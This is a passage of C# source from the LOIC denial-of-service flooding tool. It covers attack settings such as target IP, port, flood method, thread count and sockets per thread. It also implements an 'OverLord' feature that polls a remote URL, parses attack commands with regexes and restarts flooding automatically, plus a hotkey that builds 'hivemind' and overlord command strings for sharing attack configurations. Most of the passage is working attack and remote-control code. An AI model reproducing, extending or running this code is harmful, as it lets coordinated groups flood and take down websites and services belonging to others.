                            break;
                        case "message":
                            txtData.Text = "U dun goofed";
                            break;
                        case "port":
                            txtPort.Text = "80";
                            break;
                        case "method":
                            int index = cbMethod.FindString("TCP");
                            if (index != -1) { cbMethod.SelectedIndex = index; }
                            break;
                        case "threads":
                            txtThreads.Text = "10";
                            break;
                        case "wait":
                            chkResp.Checked = true;
                            break;
                        case "random":
                            chkRandom.Checked = false;
                            chkMsgRandom.Checked = false;
                            break;
                        case "speed":
                            tbSpeed.Value = 0;
                            break;
                        case "sockspthread":
                            txtSLSpT.Text = "50";
                            break;
                        case "useget":
                            chkUseGet.Checked = false;
                            break;
                        case "usegzip":
                            chkUsegZip.Checked = false;
                            break;
                    }
                }
                if (restart)
                {
                    Attack(false, false, true); 
                    if(!tZergRush.Enabled)
                        Attack(false, true, true); 
                }
                else if (ctdwndn && (cmdAttack.Text == "IMMA CHARGIN MAH LAZER"))
                {
                    Attack(false, true, true);
                }
                if(!tZergRush.Enabled)
                    this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
            }
            return ret;
        }

        /// <summary>
        /// Resolves and decodes the commands from the <paramref name="url"/> URL. (ONLY HTTP!)
        /// Calls <seealso cref="parseOLUrlCmd"/> for the actual decoding.
        /// </summary>
        /// <param name="url">URL-String. Either a shortened URL (from url-redirect-services) or the direct URL-encoded commands</param>
        /// <returns>True if the commands were successfully loaded. False in case of any error.</returns>
        private bool getOLUrlCmd(string url)
        {
            string rxpc = "([^@]?@([^=]+)=([^@]*)@)+";
            bool ret = false;
            MatchCollection matches = Regex.Matches(url, rxpc, RegexOptions.Compiled | RegexOptions.IgnoreCase | RegexOptions.ECMAScript);
            if (matches.Count == 0)
            {
                HttpWebRequest wreq = (HttpWebRequest)WebRequest.Create(url);
                wreq.AllowAutoRedirect = false;
                wreq.Method = WebRequestMethods.Http.Head;
                try
                {
                    HttpWebResponse response = (HttpWebResponse)wreq.GetResponse();
                    MatchCollection match = Regex.Matches(response.Headers.Get("Location"), rxpc, RegexOptions.Compiled | RegexOptions.IgnoreCase | RegexOptions.ECMAScript);
                    response.Close();
                    if (match.Count > 0)
                    {
                        ret = parseOLUrlCmd(match[0].Groups[2].Captures, match[0].Groups[3].Captures);
                    }
                }
                catch
                { } // most likely the url was either not an URI at all or it was not a redirect ... maybe consider it a backup?
            }
            else 
                ret = parseOLUrlCmd(matches[0].Groups[2].Captures, matches[0].Groups[3].Captures);
            return ret;
        }

 

        /// <summary>
        /// Refreshes and maintains the Overlord-controlled Settings.
        /// </summary>
        /// <param name="enabled">true to enable and autorefresh - false to stop</param>
        private void DoOverLord(bool enabled)
        { 
            tCheckOL.Stop();
            if (enabled)
            {
                WebClient client = new WebClient();
                client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); // who knows at which door we are knocking o_O
                try
                {
                    labelOLStatus.Text = "connecting...";
                    if (getOLUrlCmd(textOLServer.Text))
                    {
                        labelOLStatus.Text = "Done! Waiting for next Update..";
                    }
                    else
                    {
                        try
                        {
                            string sResp = client.DownloadString(textOLServer.Text);
                            labelOLStatus.Text = "processing...";
                            string rxpa = "(\\[LOIC\\]\\s*(<[^>]*>)*\\s*(@?(\\S+)\\s*[:]\\s*([^<@\\n\\r\\t]+)\\s*@?\\s*(<[^>]*>[^<@\\n\\r\\t]*)*\\s*)+\\s*(<[^>]*>)*\\s*\\[/LOIC\\]|class=\"LO (tar|bu)\\s*(r)?\" href=\"([^\"]*)\"|LOIC: http://(\\S+))+";
                            MatchCollection matches = Regex.Matches(sResp, rxpa, RegexOptions.Compiled | RegexOptions.IgnoreCase | RegexOptions.ECMAScript);
                            //string s = var_dump(matches, 0);
                            int i = (chkbOLUp.Checked) ? 0 : (matches.Count - 1);
                            if (matches.Count <= 0)
                                throw new Exception("nothing here");

                            while ((i >= 0) && (i < matches.Count))
                            {
                                if ((matches[i].Groups[8].Captures.Count > 0) && (matches[i].Groups[10].Captures.Count > 0))
                                { // <a class="LO bu|tar r?" href="target">
                                    if (matches[i].Groups[8].Captures[0].Value.ToLower() == "bu")
                                    {
                                        if (matches[i].Groups[9].Captures.Count > 0)
                                        {
                                            if (!aDownOLSites.Contains(matches[i].Groups[10].Captures[0].Value))
                                            {
                                                aDownOLSites.Add(matches[i].Groups[10].Captures[0].Value);
                                            }
                                        }
                                        else
                                        {
                                            if (!aUpOLSites.Contains(matches[i].Groups[10].Captures[0].Value))
                                            {
                                                aUpOLSites.Add(matches[i].Groups[10].Captures[0].Value);
                                            }
                                        }
                                    }
                                    else if (matches[i].Groups[8].Captures[0].Value.ToLower() == "tar")
                                    {
                                        if (getOLUrlCmd(matches[i].Groups[10].Captures[0].Value))
                                            break;
                                    }
                                }
                                else if (matches[i].Groups[11].Captures.Count > 0)
                                { // LOIC: URL
                                    if (getOLUrlCmd(matches[i].Groups[11].Captures[0].Value))
                                        break;
                                }
                                else if ((matches[i].Groups[4].Captures.Count > 0) && (matches[i].Groups[5].Captures.Count > 0))
                                {
                                    if (parseOLUrlCmd(matches[i].Groups[4].Captures, matches[i].Groups[5].Captures))
                                        break;
                                }
                                if (chkbOLUp.Checked)
                                    i++;
                                else
                                    i--;
                            }
                            labelOLStatus.Text = "Done! Waiting for next Update..";
                        }
                        catch
                        { // oops .. the entered URI seems to be the command
                            labelOLStatus.Text = "WTF? The URI is crap! get a working one!";
                            throw;
                        }
                    }
                }
                catch
                {
                    labelOLStatus.Text = "ALL Your OverLords are DOWN!"; //OMG ... Panic.Start(); .. btw: we switch to manual control and keep lazoring :D
                    int ni = aDownOLSites.IndexOf(labelOLStatus.Text);
                    if (ni > 0)
                        aDownOLSites.RemoveAt(ni);
                    else
                    {
                        ni = aUpOLSites.IndexOf(labelOLStatus.Text);
                        if (ni > 0)
                            aUpOLSites.RemoveAt(ni);
                    }
                    if (aDownOLSites.Count > 0)
                    {
                        textOLServer.Text = aDownOLSites[0];
                        chkbOLUp.Checked = false;
                    }
                    else if (aUpOLSites.Count > 0)
                    {
                        textOLServer.Text = aUpOLSites[0];
                        chkbOLUp.Checked = true;
                    }
                    else
                    {
                        enabled = false;
                        disableHive.Checked = true;
                    }
                }
                finally
                {
                    client.Dispose();
                }
                if (enabled)
                    tCheckOL.Start();
                else if (enableOverlord.Checked)
                    DoOverLord(true);
            }
        }

        private void enableOverlord_CheckedChanged(object sender, EventArgs e)
        {
            if (enableOverlord.Checked)
            {
                if (textOLServer.Text == "")
                {
                    disableHive.Checked = true;
                    new frmWtf().Show();
                    MessageBox.Show("Did you filled OverLord URL correctly?", "What the shit.");
                    return;
                }
                DoHive(false);
                tCheckOL.Interval = Convert.ToInt32(textOLTime.Text) * 60000;
                textOLServer.Enabled = false;
                chkbOLUp.Enabled = false;
                textOLTime.Enabled = false;
                DoOverLord(true);
            }
            else
            {
                textOLServer.Enabled = true;
                chkbOLUp.Enabled = true;
                textOLTime.Enabled = true;
                DoOverLord(false);
                tZergRush.Stop(); //no OverLord .. no need for the Zergrush anymore?
                labelOLStatus.Text = "Disconnected.";
            }
        }

        private void tCheckOL_Tick(object sender, EventArgs e)
        {
            DoOverLord(true);
        }

        private void tStartZergRush(object sender, EventArgs e)
        {
            tZergRush.Stop();
            DoOverLord(true);
        }

        private void frmMain_KeyDown(object sender, KeyEventArgs e)
        {
            switch (e.KeyCode)
            {
                case Keys.F10:
                    string hivemind = "!lazor targetip=" + txtTargetIP.Text + " targethost=" + txtTargetURL.Text
                        + "default timeout=" + txtTimeout.Text + " subsite=" + Uri.EscapeDataString(txtSubsite.Text)
                        + " message=" + Uri.EscapeDataString(txtData.Text) + " port=" + txtPort.Text + " method=" + cbMethod.SelectedItem.ToString()
                        + " threads=" + txtThreads.Text + " wait=" + ((chkResp.Checked) ? "true" : "false")
                        + " random=" + (((chkRandom.Checked && (cbMethod.SelectedIndex >= 2)) || (chkMsgRandom.Checked && (cbMethod.SelectedIndex < 2))) ? "true" : "false")
                        + " speed=" + tbSpeed.Value.ToString() + " sockspthread=" + txtSLSpT.Text
                        + " useget=" + ((chkUseGet.Checked) ? "true" : "false") + " usegzip=" + ((chkUsegZip.Checked) ? "true" : "false") + " start";

                    string overlord = "http://hive.mind/go?@targetip=" + txtTargetIP.Text + "@&@targethost=" + txtTargetURL.Text
                        + "@&@timeout=" + txtTimeout.Text + "@&@subsite=" + txtSubsite.Text
                        + "@&@message=" + txtData.Text + "@&@port=" + txtPort.Text + "@&@method=" + cbMethod.SelectedItem.ToString()
                        + "@&@threads=" + txtThreads.Text + "@&@wait=" + ((chkResp.Checked) ? "true" : "false")
                        + "@&@random=" + (((chkRandom.Checked && (cbMethod.SelectedIndex >= 2)) || (chkMsgRandom.Checked && (cbMethod.SelectedIndex < 2))) ? "true" : "false")
                        + "@&@speed=" + tbSpeed.Value.ToString() + "@&@sockspthread=" + txtSLSpT.Text
                        + "@&@useget=" + ((chkUseGet.Checked) ? "true" : "false") + "@&@usegzip=" + ((chkUsegZip.Checked) ? "true" : "false") + "@";

                    new frmEZGrab(hivemind, overlord).Show();
                    e.Handled = true;
                    break;
                case Keys.F1:
                    System.Diagnostics.Process.Start("help.chm");
                    break;
            }
        }

        private void cbMethod_SelectedIndexChanged(object sender, EventArgs e)
        {
            chkMsgRandom.Enabled = (cbMethod.SelectedIndex <= 1) ? true : false;
            txtData.Enabled = (cbMethod.SelectedIndex <= 1) ? true : false;
            chkRandom.Enabled = (cbMethod.SelectedIndex >= 2) ? true : false;
            txtSubsite.Enabled = (cbMethod.SelectedIndex >= 2) ? true : false;

            txtSLSpT.Enabled = (cbMethod.SelectedIndex >= 3) ? true : false;
            chkUsegZip.Enabled = (cbMethod.SelectedIndex >= 2) ? true : false;
            chkResp.Enabled = (cbMethod.SelectedIndex == 4) ? false : true;
            chkUseGet.Enabled = (cbMethod.SelectedIndex == 4) ? true : false;
        }

        private void txtThreads_Leave(object sender, EventArgs e)
        {
            if (cmdAttack.Text == "Stop flooding")
            {
                int num = iThreads;
                if (int.TryParse(txtThreads.Text, out num))
                {
                    iThreads = num;
                }
            }
        }

        private void TrayIcon_DoubleClick(object sender, EventArgs e)
        {
            this.ShowInTaskbar = true;
            TrayIcon.Visible = false;
            this.WindowState = FormWindowState.Normal;
            this.Focus();
        }

        private void frmMain_Resize(object sender, EventArgs e)
        {
            if ((this.WindowState == FormWindowState.Minimized) && !bIsHidden)
            {
                TrayIcon.Visible = true;
                this.ShowInTaskbar = false;
            }
        }

        private void TrayIcon_MouseMove(object sender, MouseEventArgs e)
        {
            if((TrayIcon.BalloonTipText != "") && (TrayIcon.BalloonTipTitle != ""))
                TrayIcon.ShowBalloonTip(1);
        }
    }
}